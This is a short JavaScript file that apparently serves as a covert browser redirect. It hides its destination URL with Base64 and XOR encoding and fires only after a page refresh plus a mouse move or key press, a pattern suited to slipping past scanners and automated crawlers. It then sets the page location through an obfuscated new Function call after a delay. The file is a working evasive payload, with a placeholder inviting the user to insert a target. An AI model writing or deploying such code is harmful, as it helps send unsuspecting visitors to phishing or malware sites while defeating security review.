(function () {
    let encryptedUrl = "GxEXBQFfZEoeGhELABBLKAoU";  // Replace with the correct encrypted value
    let key = "secureKey";
    let isTriggered = false;
    let refreshTriggered = false;
    let keyPressOrMoveTriggered = false;

    function xorCrypt(input, key) {
        return input.split('').map((char, i) =>
            String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length))
        ).join('');
    }

    function decryptUrl(enc, key) {
        return xorCrypt(atob(enc), key);
    }

    function stealthRedirect() {
        if (isTriggered) return; // Prevent multiple redirects
        if (refreshTriggered && keyPressOrMoveTriggered) { // Redirect only when both conditions are met
            isTriggered = true;

            setTimeout(() => {
                let targetUrl = decryptUrl(encryptedUrl, key);
                console.log("Redirecting to:", targetUrl); // Debugging log
                if (targetUrl.startsWith("http")) {  // Ensure the decrypted URL is valid
                    let f = new Function(`window["locatio" + "n"]["hre" + "f"] = "${targetUrl}";`);
                    f();
                } else {
                    console.error("Decryption failed or invalid URL");
                }
            }, 4000);
        }
    }

    if (!sessionStorage.getItem("refreshed")) {
        sessionStorage.setItem("refreshed", "true");
        console.log("First visit, waiting for refresh...");
        refreshTriggered = false;
    } else {
        refreshTriggered = true;
        console.log("Refresh detected. Waiting for key press or mouse move...");
    }

    // Track if the user presses a key or moves the mouse
    document.addEventListener("mousemove", () => {
        keyPressOrMoveTriggered = true;
        console.log("Mouse movement detected.");
        stealthRedirect(); // Call stealthRedirect to check both conditions
    });

    document.addEventListener("keydown", () => {
        keyPressOrMoveTriggered = true;
        console.log("Key press detected.");
        stealthRedirect(); // Call stealthRedirect to check both conditions
    });

})();
